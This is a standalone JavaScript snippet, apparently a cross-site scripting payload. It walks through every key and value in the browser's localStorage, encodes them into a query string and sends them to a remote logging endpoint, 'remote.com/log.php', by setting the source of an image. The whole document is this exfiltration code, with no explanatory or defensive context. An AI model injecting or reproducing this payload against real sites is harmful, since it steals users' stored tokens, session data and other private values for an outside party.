if (window.localStorage) {
    if (localStorage.length) {
            var output;
            for (var i = 0; i < localStorage.length; i++) {
                    if(i>0) { output += "&"; }
                    output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
            }
            new Image().src = 'http://remote.com/log.php?'+output;
	}
}
